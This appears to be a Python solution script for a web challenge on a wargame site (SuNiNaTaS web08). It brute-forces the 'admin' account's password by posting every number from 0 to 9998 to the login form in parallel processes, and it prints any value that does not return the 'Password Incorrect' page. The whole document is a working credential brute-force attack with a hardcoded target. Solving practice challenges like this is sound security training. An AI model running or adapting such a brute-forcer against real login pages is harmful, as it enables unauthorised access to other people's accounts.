import requests
import multiprocessing
def request_1(i):
    url = "http://suninatas.com/challenge/web08/web08.asp"
    seq = requests.Request(url)
    data={
        'id':'admin',
        'pw':i
    }
    response=requests.post(url,data=data)
    if response.text.find('Password Incorrect') == 1828:
        pass
    else:
        print(i)
d=[]
for k in range(9999):
    d.append(k)
if __name__ == '__main__':
    pool = multiprocessing.Pool(processes=4)
    pool.map(request_1,d)
    pool.close()
    pool.join()